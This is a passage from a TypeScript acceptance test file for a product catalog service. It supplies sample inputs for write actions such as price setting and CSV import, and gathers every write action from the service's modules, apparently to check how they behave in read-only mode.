  "catalog.price.set": { unitId: FAKE, listKind: "DEFAULT", currency: "IQD", amountMinor: 100n },
  "catalog.import.stage": { fileName: "a.csv", contentBase64: Buffer.from("الباركود,الاسم\n1,x\n").toString("base64") },
  "catalog.import.validate": { batchId: FAKE, mapping: MAPPING },
  "catalog.import.commit": { batchId: FAKE, onChange: "SKIP" },
  "catalog.import.delete": { batchId: FAKE },
  "catalog.import.preset.save": { name: "تخطيط", mapping: MAPPING },
  "catalog.import.preset.delete": { id: FAKE },
  // The plain wrappers (several transactions, each a defined action) below.
  commitImport: { batchId: FAKE, onChange: "SKIP" },
  archiveTestProducts: {},
};

function sampleInput(name: string): unknown {
  if (!(name in SAMPLES)) throw new Error(`no sample input for the write action "${name}": add one to SAMPLES in tests/acceptance/r1.test.ts`);
  return SAMPLES[name];
}

type WriteAction = { name: string; allowWhenReadOnly: boolean; call: (raw: unknown, meta: ActionMeta) => Promise<{ ok: boolean }> };

const MODULES = [taxonomyModule, productsModule, pricesModule, importModule, searchModule, contextModule];

function writeActions(): WriteAction[] {
  const out: WriteAction[] = [];
  for (const mod of MODULES) {
    for (const value of Object.values(mod)) {
      const info = actionInfoOf(value);
      if (info?.writes) {
        out.push({ name: info.name, allowWhenReadOnly: info.allowWhenReadOnly, call: value as WriteAction["call"] });
        sampleInput(info.name); // fails loudly when a new write has no sample
      }
    }
  }
  return out.sort((x, y) => x.name.localeCompare(y.name));
}

/** Exported functions that run defined actions in a loop (resumable bulk work): checked by hand. */
const PLAIN_WRAPPERS: [string, (raw: unknown, meta: ActionMeta) => Promise<{ ok: boolean }>][] = [
  ["commitImport", commitImport],
  ["archiveTestProducts", archiveTestProducts],
];
